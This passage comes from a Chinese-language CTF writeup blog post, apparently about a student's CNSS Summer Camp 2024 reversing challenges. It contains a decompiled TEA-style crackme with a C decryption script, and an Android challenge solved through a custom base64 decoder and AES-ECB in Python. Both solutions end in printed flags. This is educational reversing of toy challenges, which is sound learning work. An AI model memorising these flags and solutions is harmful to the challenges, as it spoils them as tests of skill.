// [rsp+60h] [rbp-20h] BYREF int j; // [rsp+78h] [rbp-8h] int i; // [rsp+7Ch] [rbp-4h] _main(argc, argv, envp); v6[0] = 429459223; v6[1] = 537200643; v6[2] = 537462290; v6[3] = 537006083; v5[0] = -999025570; v5[1] = 970203505; v5[2] = -181949973; v5[3] = -483739382; v5[4] = 1062983671; v5[5] = -697079924; printf(&quot;input the flag: \\n&quot;); scanf(&quot;%s&quot;, Str); if ( strlen((const char *)Str) == 24 ) { for ( i = 0; i &lt;= 4; ++i ) encrypt(&amp;Str[i], v6); for ( j = 0; j &lt;= 5; ++j ) { if ( Str[j] != v5[j] ) { printf(&quot;it's not my teapot!&quot;); return 0; } } printf(&quot;Oh my god, you made it?!&quot;); system(&quot;pause&quot;); return 0; } else { printf(&quot;the length is NSFW~~~&quot;); return 0; }}__int64 __fastcall encrypt(unsigned int *a1, unsigned int *a2){ __int64 result; // rax unsigned int i; // [rsp+10h] [rbp-10h] unsigned int v4; // [rsp+14h] [rbp-Ch] unsigned int v5; // [rsp+18h] [rbp-8h] unsigned int v6; // [rsp+1Ch] [rbp-4h] v6 = *a1; v5 = a1[1]; v4 = 0; for ( i = 0; i &lt;= 0x1F; ++i ) { v6 += (((v5 &gt;&gt; 5) ^ (16 * v5)) + v5) ^ (a2[v4 &amp; 3] + v4); v4 += 289739793; v5 += (((v6 &gt;&gt; 5) ^ (16 * v6)) + v6) ^ (a2[(v4 &gt;&gt; 11) &amp; 3] + v4); } *a1 = v6; result = v5; a1[1] = v5; return result;} 加密过程a1是明文，a2是密钥。 1234567891011121314151617181920212223242526272829303132333435#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;void decrypt(uint32_t* v, const uint32_t* key) { uint32_t v0 = v[0], v1 = v[1]; const uint32_t delta = 0x11451411; uint32_t sum = delta * 32; for (int i = 0; i &lt; 32; i++) { v1 -= (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (sum + key[(sum &gt;&gt; 11) &amp; 3]); sum -= delta; v0 -= (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (sum + key[sum &amp; 3]); } v[0] = v0; v[1] = v1;}int main() { uint32_t key[4] = {429459223, 537200643, 537462290, 537006083}; uint32_t enc[6] = {0xC474145E, 0x39D42171, 0xF527A9EB, 0xE32AB90A, 0x3F5BD7F7, 0xD673678C}; for (int i = 4; i &gt;= 0; i--) { decrypt(&amp;enc[i], key); } for (int i = 0; i &lt; 6; i++) { printf(&quot;%c%c%c%c&quot;, enc[i] &amp; 0xFF, (enc[i] &gt;&gt; 8) &amp; 0xFF, (enc[i] &gt;&gt; 16) &amp; 0xFF, (enc[i] &gt;&gt; 24) &amp; 0xFF); } putchar('\\n'); return 0;}/* cnss{Enj0y_te4_W!th_me!} */ 💥爆了爆了，和 JAVA 爆了啊？逆向还要学 Java？ 非常简单且入门的安卓逆向 你需要了解apk文件结构 JEB或JADX的使用 以及简单的java语法 JADX打开，翻找一通，找到com.cnss.myapplication，就是这道题的关键了。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586class Test: def __init__(self): self.str = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '+', '/'] def main(self): a = [ &quot;SJNPhthkmYBHow5Y75wRDa==&quot;, &quot;RoBAU/g/jlxuy+Ns1YtA86==&quot;, &quot;YZNTjQcHgoBaqf5hyYtM0K==&quot;, &quot;Z1Z/gv18ro1pkgF2rX5x+6==&quot;, ...#100个 &quot;bXF7hfV5smIOu/1q159Q16==&quot;, &quot;c441i+Z6r55Lmf9H4V=XD===&quot;, &quot;aY1MmRldcYRrtdlh50RJC===&quot;, &quot;Y5dYaAcAjoBtug1NwYFUBa==&quot;, &quot;TIk6kw9/pnZ41eRs1IZr4a==&quot;, &quot;cIU9ZQpjiINPy/kOw31OEa==&quot; ] for i in range(100): s = self.decode(a[i]) print(a[i]) print(s) def decode(self, code): length = len(code) if length == 0 or length % 4 != 0: return None end_equal_num = 0 if code.endswith(&quot;==&quot;): end_equal_num = 2 elif code.endswith(&quot;=&quot;): end_equal_num = 1 code = code.replace('=', '0') result = [] block_num = length // 4 for i in range(block_num): after_decode = self.decode_detail(code[i * 4:(i * 4) + 4]) if after_decode: result.append(after_decode) result_str = ''.join(result) return result_str[:len(result_str) - end_equal_num] def decode_detail(self, s): if len(s) != 4: return None a1 = self.get_index(s[0]) self.qwq() a2 = self.get_index(s[1]) self.qwq() a3 = self.get_index(s[2]) self.qwq() a4 = self.get_index(s[3]) self.qwq() b = [ chr((a1 &lt;&lt; 2) | ((a2 &amp; 48) &gt;&gt; 4)), chr(((a2 &amp; 15) &lt;&lt; 4) | ((a3 &amp; 60) &gt;&gt; 2)), chr(((a3 &amp; 3) &lt;&lt; 6) | a4) ] return ''.join(b) def get_index(self, c): try: return self.str.index(c) except ValueError: return -1 def qwq(self): tmp = [None] * 64 for i in range(len(self.str)): tmp[i] = self.str[(i + 2) % 64] self.str = tmp.copy()if __name__ == &quot;__main__&quot;: test = Test() test.main() 根据提示，key is a meaningful sentence，写个python脚本解一下base64，得到密钥。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748from base64 import b64decodefrom Crypto.Cipher import AESfrom Crypto.Util.Padding import unpaddef decode(code): if len(code) == 0 or len(code) % 4 != 0: return None end_equal_num = 0 if code.endswith(&quot;==&quot;): end_equal_num = 2 elif code.endswith(&quot;=&quot;): end_equal_num = 1 code = code.replace('=', '0') decoded_str = '' for i in range(0, len(code), 4): decoded_str += decode_detail(code[i:i+4]) result = decoded_str[:-end_equal_num] return resultdef decode_detail(encoded_str): str_chars = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot; a1 = str_chars.index(encoded_str[0]) a2 = str_chars.index(encoded_str[1]) a3 = str_chars.index(encoded_str[2]) a4 = str_chars.index(encoded_str[3]) b = chr(((a1 &lt;&lt; 2) | ((a2 &amp; 48) &gt;&gt; 4))) + \\ chr(((a2 &amp; 15) &lt;&lt; 4) | ((a3 &amp; 60) &gt;&gt; 2)) + \\ chr(((a3 &amp; 3) &lt;&lt; 6) | a4) return bdef qvq(key_str): cipher_text = b64decode(&quot;11VaDwVeOwKvL6eqb2hsA2rb0wTbTRwsb7WirGpBW8s=&quot;) key = key_str.encode('utf-8') cipher = AES.new(key, AES.MODE_ECB) decrypted_data = unpad(cipher.decrypt(cipher_text), AES.block_size) return decrypted_data.decode('utf-8')key = &quot;I am CNSS AESkey&quot;decrypted_message = qvq(key)print(decrypted_message)&quot;&quot;&quot;cnss{We1c0Me t0 Andorid Rev!}&quot;&quot;&quot; 🧩Misc没怎么做，也做不出来，笑死。做出来一道音频隐写还有一道Word文档查时间的题。 很有趣的一次经历，嘻嘻&gt;.&lt;","link":"/2024/09/07/CNSS-Summer-Camp-2024/"}],"tags":[{"name":"DevOps","slug":"DevOps","link":"/tags/DevOps/"},{"name":"Linux","slug":"Linux","link":"/tags/Linux/"},{"name":"Dev","slug":"Dev","link":"/tags/Dev/"},{"name":"CNSS","slug":"CNSS","link":"/tags/CNSS/"},{"name":"ARM","slug":"ARM","link":"/tags/ARM/"},{"name":"Computer Architecture","slug":"Computer-Architecture","link":"/tags/Computer-Architecture/"},{"name":"Math","slug":"Math","link":"/tags/Math/"},{"name":"Abstract Algebra","slug":"Abstract-Algebra","link":"/tags/Abstract-Algebra/"},{"name":"Crypto","slug":"Crypto","link":"/tags/Crypto/"},{"name":"Group Theory","slug":"Group-Theory","link":"/tags/Group-Theory/"},{"name":"CTF","slug":"CTF","link":"/tags/CTF/"}],"categories":[{"name":"DevOps","slug":"DevOps","link":"/categories/DevOps/"},{"name":"Computer Architecture","slug":"Computer-Architecture","link":"/categories/Computer-Architecture/"},{"name":"Crypto","slug":"Crypto","link":"/categories/Crypto/"},{"name":"CTF","slug":"CTF","link":"/categories/CTF/"}],"pages":[{"title":"About Me","text":"一名普普通通热爱生活的计算机本科生。","link":"/about/index.html"}]}